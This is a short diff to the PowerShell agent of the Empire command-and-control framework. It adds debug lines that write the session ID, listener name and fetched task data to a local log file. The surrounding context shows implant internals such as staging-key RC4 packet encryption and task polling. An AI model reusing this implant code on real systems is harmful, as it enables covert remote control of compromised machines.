@@ -80,6 +80,8 @@ function Invoke-Empire {
 
     # the number of times to retry server connections, i.e. the 'lost limit
     $Retries = 1
+    "sessid:"|Out-File "out.log" -Append -NoClobber
+    $SessionID|Out-File "out.log" -Append -NoClobber
 
     # set a kill date of $KillDays out if specified
     if($KillDays) {
@@ -578,6 +580,8 @@ function Invoke-Empire {
 
         $SKB = $Encoding.GetBytes($StagingKey)
         $IV=[BitConverter]::GetBytes($(Get-Random));
+        "new routing packet, sessionid:"|Out-File "out.log" -Append -NoClobber
+        $script:SessionID|Out-File "out.log" -Append -NoClobber
         $Data = $Encoding.GetBytes($script:SessionID) + @(0x01,$Meta,0x00,0x00) + [BitConverter]::GetBytes($EncDataLen)
         $RoutingPacketData = ConvertTo-Rc4ByteStream -In $Data -RCK $($IV+$SKB)
 
@@ -784,8 +788,12 @@ function Invoke-Empire {
 
 	$script:GetTask = {
 		param($Listener)
+        "calling getTask with listener" | Out-File "out.log" -Append -NoClobber
+        $Listener["name"]|Out-File "out.log" -Append -NoClobber
 
 		$TaskData = (& $Listener['get_task_func'] -FixedParameters $Listener["fixed_parameters"])
+        "taskdata:"|Out-File "out.log" -Append -NoClobber
+        $TaskData|Out-File "out.log" -Append -NoClobber
 		if (!$TaskData){
 			$Listener['missedCheckins'] += 1
 		}
